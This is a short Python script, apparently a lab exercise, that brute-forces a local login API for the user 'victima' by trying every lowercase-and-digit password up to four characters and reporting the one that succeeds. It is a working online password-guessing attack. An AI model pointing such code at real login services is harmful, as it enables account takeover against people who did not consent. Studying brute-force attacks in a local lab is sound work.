import time
import itertools
import requests

usuario_fijo = "victima" 
url_base = "http://127.0.0.1:8000/login"

def send_request(password):
    # Como definimos los campos como parámetros en la API,
    # los enviamos a través de la URL (params)
    parametros = {
        "username": usuario_fijo,
        "password": password
    }
    
    try:
        # Enviamos la petición POST con los parámetros en la URL
        response = requests.post(url_base, params=parametros)
        return response.text
    except Exception:
        return ""
def main():
    alfabeto = "abcdefghijklmnopqrstuvwxyz0123456789"
    max_len = 4
    intentos = 0
    inicio = time.time()
    for l in range(1, max_len + 1):
        for combo in itertools.product(alfabeto, repeat=l):
            intentos += 1
            clave = "".join(combo)
            respuesta = send_request(clave)
            
            # Verificamos la respuesta de la API
            if "Login exitoso" in respuesta:
                fin = time.time()
                
                print(f"CLAVE ENCONTRADA {clave}")
                print(f"Intentos: {intentos}  Tiempo: {fin - inicio:.2f}s")
                return
if __name__ == "__main__":
    main()